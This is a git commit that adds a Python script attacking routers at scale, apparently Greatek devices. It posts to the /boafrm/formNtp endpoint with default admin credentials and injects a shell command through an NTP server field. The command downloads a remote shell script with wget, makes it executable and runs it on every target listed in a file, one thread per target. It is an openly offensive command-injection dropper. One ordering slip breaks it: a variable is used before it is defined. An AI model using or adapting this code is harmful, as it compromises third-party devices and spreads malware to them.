b71c0f6f8f3b8d8876d816f82bc217061b155fbe
20Matrix77 <101499676+20Matrix77@users.noreply.github.com>
2024-10-22 04:07:01 +0500

    Add files via upload

---
+++ greatek.py
@@ -0,0 +1,34 @@
+import urllib.request
+import urllib.error
+from threading import Thread
+
+body = "timeZone=3+2&enabled=ON&ntpServerIp1=ca.pool.ntp.org&ntpServerId=1&ntpServerIp2="+payload+"&submit-url=%2Fntp.htm&save_apply=Salvar+%26+Aplicar"
+payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/skfnw.sh; chmod 777 *; sh skfnw.sh"
+
+def exploit(target):
+    try:
+        req = urllib.request.Request("http://"+target+"/boafrm/formNtp")
+
+        req.add_header("host", target)
+        req.add_header("Content-Length", "195")
+        req.add_header("Authorization", "Basic YWRtaW46YWRtaW4=")
+        req.add_header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0")
+        req.add_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
+        req.add_header("Accept-Language", "en-US,en;q=0.5")
+        req.add_header("Accept-Encoding", "gzip, deflate")
+        req.add_header("Content-Type", "application/x-www-form-urlencoded")
+        req.add_header("Origin", "http://"+target+"")
+        req.add_header("Connection", "keep-alive")
+        req.add_header("Referer", "http://"+target+"/ntp.htm")
+        req.add_header("Upgrade-Insecure-Requests", "1")
+
+        response = urllib.request.urlopen(req, data=bytes(body, 'utf-8'))
+
+        if response.status == 200:
+            print("200 " + target)
+    except Exception as e:
+        #print(e)
+        pass
+
+for line in open('f').readlines():
+    Thread(target=exploit, args=(line.rstrip(),)).start()
